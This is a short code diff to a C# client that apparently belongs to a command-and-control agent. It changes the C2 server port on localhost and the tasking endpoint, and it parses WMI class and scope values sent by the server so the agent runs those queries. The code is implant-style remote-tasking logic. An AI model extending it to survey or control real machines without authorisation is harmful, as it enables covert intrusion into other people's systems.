@@ -11,7 +11,7 @@ namespace WMInteraction
 {
     class HTTPClient
     {
-        public static string C2URL = "http://localhost:8080/";
+        public static string C2URL = "http://localhost:8090/";
 
         static HttpClient client = new HttpClient();
         private string ipAddress;
@@ -25,7 +25,7 @@ namespace WMInteraction
             this.ipAddress = ipAddress;
             this.username = username;
             this.os = os;
-            this.uri = "/api/device01/status";
+            this.uri = "/api/clients/1234/action_status";
         }
 
         public string Uri
@@ -60,11 +60,11 @@ namespace WMInteraction
 
             try
             {
-                string jsonStatus = await GetStatusAsync("/api/device01/status");
+                string jsonStatus = await GetStatusAsync("/api/clients/1234/action_status");
                 dynamic DynamicData = JsonConvert.DeserializeObject(jsonStatus);
-                wmi_component.WmiAttributes = DynamicData[0].WMI_ATTRIBUTES;
-                wmi_component.WmiClass = DynamicData[0].WMI_CLASS;
-                wmi_component.Scope = DynamicData[0].SCOPE;
+                wmi_component.WmiAttributes = "*";
+                wmi_component.WmiClass = DynamicData[0]["wmi_class"];
+                wmi_component.Scope = DynamicData[0]["wmi_scope"];
                 wmi_component.Query = new Query(wmi_component.Scope, wmi_component.WmiAttributes, wmi_component.WmiClass);
             }
             catch (Exception ex)
